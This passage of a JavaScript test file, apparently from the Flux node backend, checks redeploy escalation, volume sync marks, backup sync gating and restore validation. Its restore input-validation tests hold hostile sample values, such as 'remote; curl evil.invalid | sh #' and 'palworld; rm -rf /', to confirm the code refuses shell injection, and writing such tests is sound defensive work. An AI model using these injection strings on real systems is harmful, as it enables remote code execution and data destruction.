      const escalationMessage = messages.find(msg => msg.includes('Component structure changed'));
      expect(escalationMessage).to.exist;
      expect(escalationMessage).to.include('hard redeploy');
    });

    it('should escalate to hard redeploy when component names change for v8+ app', async () => {
      const installedApp = {
        name: 'TestApp',
        version: 8,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0' },
          { name: 'backend', repotag: 'repo/backend:1.0' },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        version: 8,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0' },
          { name: 'api', repotag: 'repo/api:1.0' }, // Renamed
        ],
      };

      // Stub dbHelper.findInDatabase to return the installed app
      findInDatabaseStub = sinon.stub(dbHelper, 'findInDatabase').resolves([installedApp]);

      // Stub appUninstaller so hardRedeploy doesn't actually try to remove the app
      // eslint-disable-next-line global-require
      const appUninstaller = require('../../ZelBack/src/services/appLifecycle/appUninstaller');
      sinon.stub(appUninstaller, 'removeAppLocally').resolves();

      // Stub appInstaller so hardRedeploy doesn't actually try to install the app
      // eslint-disable-next-line global-require
      const appInstaller = require('../../ZelBack/src/services/appLifecycle/appInstaller');
      sinon.stub(appInstaller, 'checkAppRequirements').resolves();
      sinon.stub(appInstaller, 'registerAppLocally').resolves();

      // Stub serviceHelper.delay so hardRedeploy doesn't wait
      // eslint-disable-next-line global-require
      const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
      sinon.stub(serviceHelper, 'delay').resolves();

      const res = {
        write: sinon.stub(),
        flush: sinon.stub(),
        end: sinon.stub(),
      };

      await advancedWorkflows.softRedeploy(newAppSpecs, res);

      // Should have called dbHelper.findInDatabase to check for structure changes
      expect(findInDatabaseStub.called).to.be.true;

      // Should have written escalation message to response
      expect(res.write.called).to.be.true;
      const messages = res.write.getCalls().map(call => call.args[0]);
      const escalationMessage = messages.find(msg => msg.includes('Component structure changed'));
      expect(escalationMessage).to.exist;
      expect(escalationMessage).to.include('hard redeploy');
    });

    it('should proceed with normal soft redeploy when no component structure changes', async () => {
      const installedApp = {
        name: 'TestApp',
        version: 8,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0' },
          { name: 'backend', repotag: 'repo/backend:1.0' },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        version: 8,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:2.0' }, // Only tag changed
          { name: 'backend', repotag: 'repo/backend:2.0' }, // Only tag changed
        ],
      };

      // Stub dbHelper.findInDatabase to return the installed app
      findInDatabaseStub = sinon.stub(dbHelper, 'findInDatabase').resolves([installedApp]);

      // Mock other required dependencies for soft redeploy
      sinon.stub(advancedWorkflows, 'softRemoveAppLocally').resolves();
      sinon.stub(advancedWorkflows, 'softRegisterAppLocally').resolves();

      // Stub appInstaller.checkAppRequirements so softRedeploy doesn't validate real env
      // eslint-disable-next-line global-require
      const appInstaller = require('../../ZelBack/src/services/appLifecycle/appInstaller');
      sinon.stub(appInstaller, 'checkAppRequirements').resolves();

      const clock = sinon.useFakeTimers();

      const res = {
        write: sinon.stub(),
        flush: sinon.stub(),
        end: sinon.stub(),
      };

      const softRedeployPromise = advancedWorkflows.softRedeploy(newAppSpecs, res);
      await clock.tickAsync(31 * 1000);
      await softRedeployPromise;

      expect(findInDatabaseStub.called).to.be.true;

      // Should not have written escalation message to response
      const messages = res.write.getCalls().map(call => call.args[0]);
      const escalationMessage = messages.find(msg => msg.includes('Component structure changed'));
      expect(escalationMessage).to.not.exist;
    });

    it('should not check component structure for v4-7 apps during soft redeploy', async () => {
      const installedApp = {
        name: 'TestApp',
        version: 7,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:1.0' },
          { name: 'backend', repotag: 'repo/backend:1.0' },
        ],
      };

      const newAppSpecs = {
        name: 'TestApp',
        version: 7,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:2.0' },
          { name: 'backend', repotag: 'repo/backend:2.0' },
        ],
      };

      findInDatabaseStub = sinon.stub(dbHelper, 'findInDatabase').resolves([installedApp]);

      // Mock other required dependencies
      sinon.stub(advancedWorkflows, 'softRemoveAppLocally').resolves();
      sinon.stub(advancedWorkflows, 'softRegisterAppLocally').resolves();

      // Stub appInstaller.checkAppRequirements so softRedeploy doesn't validate real env
      // eslint-disable-next-line global-require
      const appInstaller = require('../../ZelBack/src/services/appLifecycle/appInstaller');
      sinon.stub(appInstaller, 'checkAppRequirements').resolves();

      const clock = sinon.useFakeTimers();

      const res = {
        write: sinon.stub(),
        flush: sinon.stub(),
        end: sinon.stub(),
      };

      const softRedeployPromise = advancedWorkflows.softRedeploy(newAppSpecs, res);
      await clock.tickAsync(31 * 1000);
      await softRedeployPromise;

      // For v4-7 apps, component structure checks are not applicable.
      expect(findInDatabaseStub.called).to.be.false;
    });

    it('should not escalate to hard redeploy when enterprise compose is redacted in local DB', async () => {
      const installedApp = {
        name: 'TestApp',
        version: 8,
        enterprise: 'encryptedEnterprisePayload',
        compose: [], // Redacted in local DB
        hash: 'testhash',
      };

      const newAppSpecs = {
        name: 'TestApp',
        version: 8,
        compose: [
          { name: 'frontend', repotag: 'repo/frontend:2.0' },
          { name: 'backend', repotag: 'repo/backend:2.0' },
        ],
      };

      findInDatabaseStub = sinon.stub(dbHelper, 'findInDatabase').resolves([installedApp]);

      sinon.stub(advancedWorkflows, 'softRemoveAppLocally').resolves();
      sinon.stub(advancedWorkflows, 'softRegisterAppLocally').resolves();

      // Stub appInstaller.checkAppRequirements so softRedeploy doesn't validate real env
      // eslint-disable-next-line global-require
      const appInstaller = require('../../ZelBack/src/services/appLifecycle/appInstaller');
      sinon.stub(appInstaller, 'checkAppRequirements').resolves();

      const clock = sinon.useFakeTimers();

      const res = {
        write: sinon.stub(),
        flush: sinon.stub(),
        end: sinon.stub(),
      };

      const softRedeployPromise = advancedWorkflows.softRedeploy(newAppSpecs, res);
      await clock.tickAsync(31 * 1000);
      await softRedeployPromise;

      expect(findInDatabaseStub.called).to.be.true;

      const messages = res.write.getCalls().map(call => call.args[0]);
      const escalationMessage = messages.find(msg => msg.includes('Component structure changed'));
      expect(escalationMessage).to.not.exist;
    });
  });

  describe('createAppVolume synced-mark invalidation', () => {
    const identifier = 'fluxfrontend_TestApp';
    const component = { name: 'frontend', hdd: 1 };
    let volGlobalState;

    const armSyncedMark = () => {
      volGlobalState.receiveOnlySyncthingAppsCache.set(identifier, {
        restarted: true, numberOfExecutionsRequired: 4, numberOfExecutions: 10,
      });
    };

    beforeEach(() => {
      volGlobalState = require('../../ZelBack/src/services/utils/globalState');
      volGlobalState.receiveOnlySyncthingAppsCache.clear();
      const hwRequirements = require('../../ZelBack/src/services/appRequirements/hwRequirements');
      sinon.stub(hwRequirements, 'getNodeSpecs').resolves({ ssdStorage: 10000 });
      // The volume search reads the real mount table through findmnt. Stubbing
      // it keeps these cases about the synced-mark rather than about whichever
      // disks the machine running the suite happens to have.
      // eslint-disable-next-line global-require
      const volumeService = require('../../ZelBack/src/services/utils/volumeService');
      sinon.stub(volumeService, 'capacityVolumesInGib').resolves([
        {
          filesystem: '/dev/sda1', mount: '/dat', size: 1000, used: 100, available: 900,
        },
      ]);
    });

    afterEach(() => {
      volGlobalState.receiveOnlySyncthingAppsCache.clear();
    });

    it('preserves the synced-mark when the pre-flight aborts before any volume is touched', async () => {
      // a recreate whose pre-flight fails (a resources-query blip, or out of
      // space - the LIKELY population for failed recreates) leaves the existing
      // volume and its data untouched. Stripping the mark there would hand
      // intact data to the not-in-cache skip / second-encounter chain, which
      // clears it.
      armSyncedMark();
      const resourceQueryService = require('../../ZelBack/src/services/appQuery/resourceQueryService');
      sinon.stub(resourceQueryService, 'appsResources').resolves({ status: 'error' });

      let thrown = null;
      try {
        await advancedWorkflows.createAppVolume(component, 'TestApp', true, null);
      } catch (error) { thrown = error; }

      expect(thrown, 'the pre-flight abort did not fire').to.not.equal(null);
      expect(thrown.message).to.include('Unable to obtain locked system resources');
      expect(
        volGlobalState.receiveOnlySyncthingAppsCache.has(identifier),
        'an aborted pre-flight stripped the synced-mark of an app whose data is intact',
      ).to.equal(true);
    });

    it('drops a stale synced-mark at the point of no return', async () => {
      // once the allocation runs the old volume state is gone: a cache entry
      // surviving from the previous incarnation would let this fresh install
      // skip the new-install receiveonly protection and read as instantly
      // ready to become g: primary.
      armSyncedMark();
      const resourceQueryService = require('../../ZelBack/src/services/appQuery/resourceQueryService');
      sinon.stub(resourceQueryService, 'appsResources').resolves({ status: 'success', data: { appsHddLocked: 0 } });
      // let the flow reach the point of no return, then block the allocation
      // itself - the drop must already have happened by then
      const svcHelper = require('../../ZelBack/src/services/serviceHelper');
      sinon.stub(svcHelper, 'runCommand').callsFake(async (cmd) => (
        cmd === 'fallocate' ? { error: new Error('fallocate blocked by test') } : {}));

      let thrown = null;
      try {
        await advancedWorkflows.createAppVolume(component, 'TestApp', true, null);
      } catch (error) { thrown = error; }

      // assert WHICH error aborted before judging the cache: this test rides
      // the host's real df output through the space pre-flight, so on a
      // low-disk host the pre-flight throws first - that must read as "never
      // reached the allocation", not as a phantom production regression
      expect(thrown, 'the flow never reached the allocation').to.not.equal(null);
      expect(thrown.message, 'the flow aborted before the allocation').to.equal('fallocate blocked by test');
      expect(
        volGlobalState.receiveOnlySyncthingAppsCache.has(identifier),
        'the point of no return left a stale synced-mark in place',
      ).to.equal(false);
    });
  });

  describe('appendBackupTask sync gate tests', () => {
    // A backup is deliberately taken from a standby - the quiescent copy - so
    // the only thing that makes the archive worth keeping is that the copy is
    // COMPLETE. A folder that has never synced (or is behind) archives whatever
    // happens to be on disk, which can be nothing: that is how a 373-byte
    // "backup" of a 35 GB app came to exist, and restoring it destroyed the
    // world it was supposed to protect.
    // eslint-disable-next-line global-require
    const verificationHelper = require('../../ZelBack/src/services/verificationHelper');
    // eslint-disable-next-line global-require
    const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
    // eslint-disable-next-line global-require
    const stateMachine = require('../../ZelBack/src/services/appMonitoring/syncthingFolderStateMachine');
    // eslint-disable-next-line global-require
    const syncthingService = require('../../ZelBack/src/services/syncthingService');
    // eslint-disable-next-line global-require
    const dockerService = require('../../ZelBack/src/services/dockerService');
    // eslint-disable-next-line global-require
    const IOUtils = require('../../ZelBack/src/services/IOUtils');
    // eslint-disable-next-line global-require
    const globalState = require('../../ZelBack/src/services/utils/globalState');

    const appname = 'palworld1785719281005';
    const folderId = `fluxpalworld_${appname}`;

    function makeRes() {
      return {
        write: sinon.stub(),
        flush: sinon.stub(),
        end: sinon.stub(),
        json: sinon.stub(),
        chunks: [],
      };
    }

    function backupReq() {
      return { body: { appname, backup: [{ component: 'palworld', backup: true }] }, headers: {} };
    }

    beforeEach(() => {
      globalState.backupInProgress = [];
      // the flow sleeps between phases; that is not what these tests are about
      // eslint-disable-next-line global-require
      const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
      sinon.stub(serviceHelper, 'delay').resolves();
      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);
      sinon.stub(registryManager, 'getApplicationGlobalSpecifications').resolves({
        version: 8,
        name: appname,
        compose: [{ name: 'palworld', containerData: 'g:/palworld/Pal/Saved|m:mods:/mods' }],
      });
      // The stop enumerates the app's components from here. Unstubbed it threw
      // 'Application not found', which the old wrapper swallowed - so these
      // tests passed while nothing was ever stopped.
      sinon.stub(registryManager, 'getApplicationSpecifications').resolves({
        version: 8,
        name: appname,
        compose: [{ name: 'palworld', containerData: 'g:/palworld/Pal/Saved|m:mods:/mods' }],
      });
      sinon.stub(syncthingService, 'adjustConfigFolders').resolves({ status: 'success' });
      sinon.stub(dockerService, 'appDockerStop').resolves();
      // The stop is verified by reading the container back, not by the stop
      // call returning - so this stub is what makes the containers actually
      // down for these tests. Set it Running to exercise the refusal.
      sinon.stub(dockerService, 'dockerContainerInspect').resolves({ State: { Running: false } });
      // dockerActual falls back to a LIST call when the inspect fails, to tell
      // an unreachable daemon from a container that is genuinely gone. Docker is
      // a network boundary and has to be stubbed at it - left real, these tests
      // pass or fail on whether the machine running them happens to have docker.
      sinon.stub(dockerService, 'dockerListContainers').resolves([]);
      sinon.stub(dockerService, 'appDockerStart').resolves();
      sinon.stub(IOUtils, 'createTarGz').resolves({ status: true });
      sinon.stub(IOUtils, 'checkFileExists').resolves(false);
      sinon.stub(IOUtils, 'removeFile').resolves(true);
      sinon.stub(IOUtils, 'getVolumeInfo').resolves({ error: null, mounts: [{ mount: '/mnt/appdata/flux-apps/fluxpalworld_x' }] });
      sinon.stub(log, 'info');
      sinon.stub(log, 'warn');
      sinon.stub(log, 'error');
    });

    it('refuses when this instance has no syncthing folder at all', async () => {
      // the incident shape: the node was never configured to sync, so its copy
      // is empty by construction
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({ status: null, reason: 'absent' });
      const res = makeRes();

      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);

      expect(result).to.equal(false);
      sinon.assert.notCalled(IOUtils.createTarGz);
      // and it cost the app nothing: the refusal lands before any stop
      sinon.assert.notCalled(dockerService.appDockerStop);
      sinon.assert.notCalled(syncthingService.adjustConfigFolders);
      expect(globalState.backupInProgress).to.not.include(appname);
    });

    it('refuses cleanly when the app has no specification, not with a TypeError', async () => {
      // The restore guards this; the backup read the spec and handed it straight
      // to syncedComponentsOfApp, which threw on null deep in the flow instead of
      // saying what was wrong.
      registryManager.getApplicationGlobalSpecifications.resolves(null);
      const res = makeRes();

      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);

      expect(result).to.equal(false);
      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
      expect(said).to.include('no specifications found');
      sinon.assert.notCalled(dockerService.appDockerStop);
    });

    it('refuses a backup that is not a list of components, not with a TypeError', async () => {
      // The UI always sends an array. A caller that sends the single component it
      // wants as a bare value reached .some() and had the interpreter's own
      // wording relayed down the progress stream as the refusal.
      const res = makeRes();

      const result = await advancedWorkflows.appendBackupTask(
        { body: { appname, backup: 'palworld' }, headers: {} }, res,
      );

      expect(result).to.equal(false);
      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
      expect(said).to.include('backup must be a list of components');
      expect(said, 'the refusal is stated, not relayed from the interpreter').to.not.include('is not a function');
      // and it lands ahead of the claim, so the app is not left leased
      expect(globalState.backupInProgress).to.not.include(appname);
    });

    it('refuses when syncthing cannot be reached, and does not call that "never synced"', async () => {
      // A daemon that is down or restarting says nothing about the data. The
      // refusal is still right - an archive of an unverified copy looks fine and
      // loses data when it is restored months later - but telling an operator
      // their instance has never synced, at the moment they are trying to protect
      // it, is a false statement about their data.
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({ status: null, reason: 'unknown' });
      const res = makeRes();

      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);

      expect(result).to.equal(false);
      sinon.assert.notCalled(IOUtils.createTarGz);
      sinon.assert.notCalled(dockerService.appDockerStop);
      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
      expect(said, 'says what actually happened').to.include('could not be determined');
      expect(said, 'and does not claim anything about the data').to.not.include('never synced');
    });

    it('does not call an empty index "100% synced" while refusing it', async () => {
      // Nothing in the global index means nothing to take a fraction of, so the
      // percentage falls back to 100. Printing it says the copy is complete in
      // the same message that refuses it for being incomplete.
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: {
          isSynced: false, syncPercentage: 100, inSyncBytes: 0, globalBytes: 0,
        },
        reason: 'ok',
      });
      const res = makeRes();

      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);

      expect(result).to.equal(false);
      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
      expect(said, 'never claims completeness while refusing').to.not.include('100.00% synced');
      expect(said).to.include('nothing in the sync index yet');
    });

    it('refuses a copy that is still catching up', async () => {
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: { isSynced: false, syncPercentage: 41.5, inSyncBytes: 415, globalBytes: 1000 },
        reason: 'ok',
      });
      const res = makeRes();

      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);

      expect(result).to.equal(false);
      sinon.assert.notCalled(IOUtils.createTarGz);
      sinon.assert.notCalled(dockerService.appDockerStop);
    });

    it('proceeds over an incomplete copy when force is given', async () => {
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({ status: null, reason: 'absent' });
      const req = backupReq();
      req.body.force = true;

      const result = await advancedWorkflows.appendBackupTask(req, makeRes());

      expect(result).to.equal(true);
      sinon.assert.calledOnce(IOUtils.createTarGz);
    });

    it('pauses the folder for the archive and never deletes it', async () => {
      // deleting the folder loses its config, and only the syncthing monitor's
      // per-app pass ever recreates it - on a node where that pass cannot
      // complete, the app silently stops being redundant for good
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
        reason: 'ok',
      });

      const result = await advancedWorkflows.appendBackupTask(backupReq(), makeRes());

      expect(result).to.equal(true);
      sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
      sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
      sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'delete');
    });

    it('refuses when the pause is denied, instead of reading denial as absence', async () => {
      // ERR_BAD_REQUEST spans every 4xx, so the axios code cannot tell a 404
      // (no such folder - nothing to hold) from a 403 (a stale api key - the
      // folder may be live and unheld). Only the HTTP status separates them,
      // and anything but a bare 404 must refuse: proceeding clears appdata
      // under a live sendreceive folder and the deletions reach every peer.
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
        reason: 'ok',
      });
      syncthingService.adjustConfigFolders.resolves({
        status: 'error',
        data: {
          message: 'Request failed with status code 403', name: 'AxiosError', code: 'ERR_BAD_REQUEST', httpStatus: 403,
        },
      });
      const res = makeRes();

      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);

      expect(result).to.equal(false);
      sinon.assert.notCalled(IOUtils.createTarGz);
      sinon.assert.notCalled(dockerService.appDockerStop);
      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
      expect(said).to.include('could not be held still');
    });

    it('reads a bare 404 as the folder being absent, and proceeds', async () => {
      // syncthing replied: it holds no such folder, so nothing is replicating
      // the directory and there is nothing to hold still.
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
        reason: 'ok',
      });
      syncthingService.adjustConfigFolders.resolves({
        status: 'error',
        data: {
          message: 'Request failed with status code 404', name: 'AxiosError', code: 'ERR_BAD_REQUEST', httpStatus: 404,
        },
      });

      const result = await advancedWorkflows.appendBackupTask(backupReq(), makeRes());

      expect(result).to.equal(true);
      sinon.assert.calledOnce(IOUtils.createTarGz);
    });

    it('resolves the folder id per COMPONENT, not from the app name', async () => {
      // folder ids are docker app identifiers, so a composed app's folder is
      // flux<component>_<app>. Addressing it as flux<app> matches nothing, and
      // the freeze silently does not happen.
      const completion = sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
        reason: 'ok',
      });

      await advancedWorkflows.appendBackupTask(backupReq(), makeRes());

      sinon.assert.calledWithExactly(completion, `fluxpalworld_${appname}`);
      sinon.assert.neverCalledWith(completion, `flux${appname}`);
    });

    it('resumes the folder when the archive fails', async () => {
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
        reason: 'ok',
      });
      IOUtils.createTarGz.resolves({ status: false, error: 'no space left on device' });

      const result = await advancedWorkflows.appendBackupTask(backupReq(), makeRes());

      expect(result).to.equal(false);
      sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
      expect(globalState.backupInProgress).to.not.include(appname);
    });

    it('lets only one of two concurrent backups of the same app proceed', async () => {
      // Between the old check and its later claim sat auth, a spec fetch and a
      // sync probe per component; two requests could both pass the emptied
      // check and archive the same volume at once. The claim is now a
      // synchronous test-and-set before any of that, so the second finds the
      // app taken and refuses.
      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
        reason: 'ok',
      });

      const first = advancedWorkflows.appendBackupTask(backupReq(), makeRes());
      const second = advancedWorkflows.appendBackupTask(backupReq(), makeRes());

      const [firstResult, secondResult] = await Promise.all([first, second]);

      expect([firstResult, secondResult]).to.have.members([true, false]);
      sinon.assert.calledOnce(IOUtils.createTarGz);
    });

    // appownerorfluxteam admits the app's owner and the flux team, and refuses the
    // node operator - so the string this asks for is the whole of the policy. An
    // archive of a customer's volume is theirs, and taking one off the node is
    // not their host's to order.
    it('gates a backup on the privilege that refuses the node operator', async () => {
      verificationHelper.verifyPrivilege.resolves(false);
      const req = backupReq();

      await advancedWorkflows.appendBackupTask(req, makeRes());

      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: appname });
      sinon.assert.notCalled(IOUtils.createTarGz);
    });
  });

  describe('appendRestoreTask tests', () => {
    // The restore deleted appdata before it had an archive to put back, and then
    // told every other instance to hard redeploy - which rm -rf'd their volumes.
    // A 373-byte archive taken from an instance that had never synced was enough
    // to destroy a 35 GB world on the one node that did hold it. So: nothing is
    // destroyed until a complete archive is known to exist, and no peer is ever
    // asked to delete anything.
    // eslint-disable-next-line global-require
    const verificationHelper = require('../../ZelBack/src/services/verificationHelper');
    // eslint-disable-next-line global-require
    const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
    // eslint-disable-next-line global-require
    const syncthingService = require('../../ZelBack/src/services/syncthingService');
    // eslint-disable-next-line global-require
    const dockerService = require('../../ZelBack/src/services/dockerService');
    // eslint-disable-next-line global-require
    const IOUtils = require('../../ZelBack/src/services/IOUtils');
    // eslint-disable-next-line global-require
    const globalState = require('../../ZelBack/src/services/utils/globalState');
    // eslint-disable-next-line global-require
    const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
    // eslint-disable-next-line global-require
    const fluxNetworkHelper = require('../../ZelBack/src/services/fluxNetworkHelper');
    // eslint-disable-next-line global-require
    const appController = require('../../ZelBack/src/services/appManagement/appController');
    // eslint-disable-next-line global-require
    const appReconciler = require('../../ZelBack/src/services/appMonitoring/appReconciler');
    // eslint-disable-next-line global-require
    const appInspector = require('../../ZelBack/src/services/appManagement/appInspector');
    // eslint-disable-next-line global-require
    const { appsFolder } = require('../../ZelBack/src/services/utils/appConstants');

    const appname = 'palworld1785719281005';
    const folderId = `fluxpalworld_${appname}`;
    const mount = `/mnt/appdata/flux-apps/${folderId}`;
    const localAddr = '1.2.3.4:16127';

    function specWith(containerData) {
      return {
        version: 8,
        name: appname,
        compose: [{ name: 'palworld', containerData }],
      };
    }

    function makeRes() {
      return {
        write: sinon.stub(), flush: sinon.stub(), end: sinon.stub(), json: sinon.stub(),
      };
    }

    // The UI sends EVERY component of the app on every request, the unselected
    // ones flagged false and carrying an empty url.
    function restoreReq(overrides = {}) {
      return {
        body: {
          appname,
          type: 'remote',
          restore: [
            { component: 'palworld', restore: true, url: 'https://example.invalid/backup_palworld.tar.gz' },
            { component: 'sidecar', restore: false, url: '' },
          ],
          ...overrides,
        },
        headers: { zelidauth: 'auth' },
      };
    }

    function fdmNames(ip) {
      serviceHelper.axiosGet.resolves({ data: { status: 'success', data: { ips: [ip] } } });
    }

    beforeEach(() => {
      // Release any lease a prior test left, through the claim's own primitive -
      // the list is a frozen snapshot to reads, so only finishRestore clears it.
      globalState.finishRestore(appname);
      globalState.receiveOnlySyncthingAppsCache.clear();
      sinon.stub(serviceHelper, 'delay').resolves();
      sinon.stub(serviceHelper, 'axiosGet').resolves({ data: { status: 'success', data: { ips: [localAddr] } } });
      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);
      sinon.stub(registryManager, 'getApplicationGlobalSpecifications').resolves(specWith('g:/palworld/Pal/Saved|m:mods:/mods'));
      sinon.stub(registryManager, 'getApplicationSpecifications').resolves(specWith('g:/palworld/Pal/Saved|m:mods:/mods'));
      sinon.stub(syncthingService, 'adjustConfigFolders').resolves({ status: 'success' });
      sinon.stub(syncthingService, 'getConfigFolders').resolves([{ id: folderId, path: `${appsFolder}${folderId}`, type: 'sendreceive' }]);
      sinon.stub(dockerService, 'appDockerStop').resolves();
      // The stop is verified by reading the container back, not by the stop
      // call returning - so this stub is what makes the containers actually
      // down for these tests. Set it Running to exercise the refusal.
      sinon.stub(dockerService, 'dockerContainerInspect').resolves({ State: { Running: false } });
      // dockerActual falls back to a LIST call when the inspect fails, to tell
      // an unreachable daemon from a container that is genuinely gone. Docker is
      // a network boundary and has to be stubbed at it - left real, these tests
      // pass or fail on whether the machine running them happens to have docker.
      sinon.stub(dockerService, 'dockerListContainers').resolves([]);
      sinon.stub(dockerService, 'appDockerStart').resolves();
      // Starting a component arms a sixty-second sampling interval against
      // docker, and nothing here ever stops it. It outlives the test, wakes on a
      // container that was never created, and writes an error through the real
      // log into whichever test the suite happens to be running a minute later -
      // which is a different one on every machine. Stubbed for the same reason
      // dockerService.appDockerStart above is: this describe is about the
      // restore, and docker is a boundary.
      sinon.stub(appInspector, 'startAppMonitoring');
      sinon.stub(fluxNetworkHelper, 'getLocalSocketAddress').resolves(localAddr);
      sinon.stub(appController, 'executeAppGlobalCommand').resolves();
      sinon.stub(appReconciler, 'setControllerDesired');
      sinon.stub(IOUtils, 'getVolumeInfo').resolves({ error: null, mounts: [{ mount, available: 100 * 1024 * 1024 * 1024 }] });
      sinon.stub(IOUtils, 'removeDirectory').resolves(true);
      sinon.stub(IOUtils, 'downloadFileFromUrl').resolves(true);
      sinon.stub(IOUtils, 'getRemoteFileSize').resolves(4096);
      sinon.stub(IOUtils, 'getFileSize').resolves(4096);
      sinon.stub(IOUtils, 'inspectTarGz').resolves({ status: true, entries: 1200, bytes: 900 * 1024 * 1024 });
      sinon.stub(IOUtils, 'getDirectorySizeBytes').resolves(800 * 1024 * 1024);
      sinon.stub(IOUtils, 'untarFile').resolves({ status: true });
      sinon.stub(IOUtils, 'removeFile').resolves(true);
      sinon.stub(log, 'info');
      sinon.stub(log, 'warn');
      sinon.stub(log, 'error');
    });

    describe('input validation', () => {
      it('refuses a type that is not one of the three backup directories', async () => {
        // type names a directory inside the volume and reaches a shell through
        // tar, so an unrecognised one must be refused, never interpolated
        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ type: 'remote; curl evil.invalid | sh #' }), makeRes());

        expect(result).to.equal(false);
        sinon.assert.notCalled(IOUtils.untarFile);
        sinon.assert.notCalled(IOUtils.removeDirectory);
        sinon.assert.notCalled(dockerService.appDockerStop);
      });

      it('refuses a restore that is not a list of components, not with a TypeError', async () => {
        const res = makeRes();

        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ restore: 'palworld' }), res);

        expect(result).to.equal(false);
        const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
        expect(said).to.include('restore must be a list of components');
        expect(said, 'the refusal is stated, not relayed from the interpreter').to.not.include('is not a function');
        sinon.assert.notCalled(IOUtils.untarFile);
        expect(globalState.restoreInProgress).to.not.include(appname);
      });

      it('refuses a component the app does not have', async () => {
        const req = restoreReq();
        req.body.restore = [{ component: 'palworld; rm -rf /', restore: true, url: 'https://example.invalid/a.tar.gz' }];

        const result = await advancedWorkflows.appendRestoreTask(req, makeRes());

        expect(result).to.equal(false);
        sinon.assert.notCalled(IOUtils.untarFile);
        sinon.assert.notCalled(IOUtils.removeDirectory);
      });

      it('acts on a component named twice only once', async () => {
        // the second pass would clear what the first had just put in place
        const req = restoreReq();
        req.body.restore = [
          { component: 'palworld', restore: true, url: 'https://example.invalid/a.tar.gz' },
          { component: 'palworld', restore: true, url: 'https://example.invalid/a.tar.gz' },
        ];

        await advancedWorkflows.appendRestoreTask(req, makeRes());

        sinon.assert.calledOnce(IOUtils.untarFile);
        sinon.assert.calledOnce(IOUtils.removeDirectory.withArgs(`${mount}/appdata`, true));
      });

      it('lets only one of two concurrent restores of the same app proceed', async () => {
        // The claim is a synchronous test-and-set before any awaited work, so
        // the first request holds the app before the second runs its own
        // validation - the second finds it taken and refuses, rather than both
        // passing an emptied check and clearing the same volume at once. (The
        // old "push during the spec lookup" simulation no longer bites: the
        // getter hands out a snapshot, so only the claim primitive can write.)
        const first = advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
        const second = advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        const [firstResult, secondResult] = await Promise.all([first, second]);

        expect([firstResult, secondResult]).to.have.members([true, false]);
        // one restore ran, the other never touched the volume
        sinon.assert.calledOnce(IOUtils.untarFile);
      });

      it('restores only the components asked for, not every one the UI listed', async () => {
        registryManager.getApplicationGlobalSpecifications.resolves({
          version: 8,
          name: appname,
          compose: [
            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
            { name: 'sidecar', containerData: '/data' },
          ],
        });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledOnce(IOUtils.untarFile);
        sinon.assert.calledWith(IOUtils.untarFile, `${mount}/appdata`);
      });
    });

    describe('acquire before destroy', () => {
      it('does not touch appdata when the archive is unreadable', async () => {
        IOUtils.inspectTarGz.resolves({ status: false, error: 'gzip: unexpected end of file' });

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(false);
